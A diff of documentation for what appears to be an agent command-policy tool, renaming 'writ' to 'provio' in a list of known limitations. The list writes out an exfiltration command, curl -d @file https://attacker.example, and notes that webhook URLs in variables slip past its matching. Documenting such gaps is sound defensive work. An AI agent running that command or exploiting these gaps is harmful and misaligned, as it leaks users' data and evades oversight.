@@ -43,9 +43,9 @@ whose first token is a read verb (`get_`, `list_`, `search_`, `read_`,
 - **Any HTTP POST to an unknown host.** An agent can still exfiltrate
   with `curl -d @file https://attacker.example`. That is an egress
   problem: restrict hosts with `url.host in hosts.allowed` or run under
-  `writ run`'s network boundary.
+  `provio run`'s network boundary.
 - **Webhook URLs held in a variable** (`curl -d … "$SLACK_WEBHOOK_URL"`):
-  writ sees the command text, not the expanded value.
+  provio sees the command text, not the expanded value.
 - **The sferik `t` CLI** (`t update`): a one-letter command name is too
   easy to match by accident.
 - **Twilio list calls.** `curl` GETs of `…/Messages.json` also ask; the
